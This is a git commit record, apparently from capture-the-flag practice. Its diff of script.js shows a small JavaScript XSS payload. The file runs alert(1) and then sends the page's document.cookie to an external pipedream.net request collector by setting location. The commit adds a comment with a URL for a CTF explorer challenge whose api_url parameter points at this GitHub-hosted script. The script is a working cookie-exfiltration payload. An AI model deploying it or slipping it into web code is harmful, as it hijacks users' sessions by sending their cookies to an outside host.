05b81af389eab1c743febaad9ff9bae17f34a96a
Awad Osman <awadalbrka@gmail.com>
2024-01-12 16:57:18 +0100

    test

--- script.js
+++ script.js
@@ -1,3 +1,6 @@
 alert(1)
 
 location.origin = "https://en15egjaz48z1.x.pipedream.net/"+document.cookie;
+
+
+// http://explorer.ctf.offdef.it/?api_url=https%3A%2F%2Fapi.github.com%2Frepos%2FTA50%2Fexp%2Fcontents%2Fs%3Fref%3Dmain
